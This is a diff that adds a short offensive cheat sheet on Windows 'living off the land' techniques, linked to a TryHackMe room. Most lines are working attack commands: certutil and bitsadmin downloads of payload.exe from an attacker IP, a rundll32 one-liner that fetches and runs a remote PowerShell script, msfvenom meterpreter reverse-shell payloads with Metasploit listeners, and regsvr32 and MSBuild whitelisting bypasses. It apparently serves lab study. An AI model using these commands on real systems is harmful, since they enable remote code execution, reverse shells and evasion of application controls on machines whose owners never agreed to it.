@@ -1,0 +1,81 @@
+### off the land tools ###
+## links ##
+https://tryhackme.com/room/livingofftheland
+
+
+
+## Sysinternal Live ##
+# into Windows Explorer
+\\live.sysinternals.com\tools
+
+
+## LOLBAS project ##
+# https://lolbas-project.github.io/
+
+
+
+## Download ##
+# certutil
+certutil -URLcache -split -f http://10.8.98.114/payload.exe C:\Windows\Temp\payload.exe
+certutil -encode payload.exe Encoded-payload.txt
+certutil -decode Encoded-payload.txt payload.exe
+
+# BITSAdmin
+bitsadmin.exe /transfer /Download /priority Foreground http://10.8.98.114/payload.exe C:\Users\thm\Desktop\payload.exe
+
+# findstr SMB shared folders
+findstr /V dummystring \\MachineName\ShareFolder\test.exe > c:\Windows\Temp\test.exe
+
+
+
+## Exec ##
+# explorer
+# C:\Windows\explorer.exe for the Windows 32 bits version
+# C:\Windows\SysWOW64\explorer.exe for the Windows 64 bits version
+explorer.exe /root,"C:\Windows\System32\calc.exe"
+
+# wmic 
+wmic.exe process call create calc
+
+# rundll32
+# C:\Windows\System32\rundll32.exe for the Windows 32 bits version
+# C:\Windows\SysWOW64\rundll32.exe for the Windows 64 bits version
+rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://10.8.98.114/script.ps1');");
+
+
+
+## App Whitelist Bypass ##
+# regsvr32
+# C:\Windows\System32\regsvr32.exe for the Windows 32 bits version
+# C:\Windows\SysWOW64\regsvr32.exe for the Windows 64 bits version
+# create payload and setup listener
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.8.98.114 LPORT=443 -f dll -a x86 > lol.dll
+sudo python3 -m http.server 80
+msfconsole -q
+> use exploit/multi/handler
+> set payload windows/meterpreter/reverse_tcp 
+> ... etc
+c:\Windows\System32\regsvr32.exe c:\Users\thm\Downloads\lol.dll
+c:\Windows\System32\regsvr32.exe /s /n /u /i:http://example.com/file.sct Downloads\lol.dll
+
+# bash
+# if WSL is installed
+bash -c calc.exe
+
+
+
+## others ##
+# no powershell
+git clone https://github.com/Mr-Un1k0d3r/PowerLessShell.git
+msfvenom -p windows/meterpreter/reverse_winhttps LHOST=10.8.98.114 LPORT=4444 -f psh-reflection > lol.ps1
+msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_winhttps; set lhost 10.8.98.114;set lport 4444;exploit"
+cp lol.ps1 /tmp/lol.ps1
+python2 PowerLessShell.py -type powershell -source /tmp/lol.ps1 -output lol.csproj
+# transfert file to pwned machine
+c:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe c:\Users\thm\Desktop\lol.csproj
+
+
+
+
+
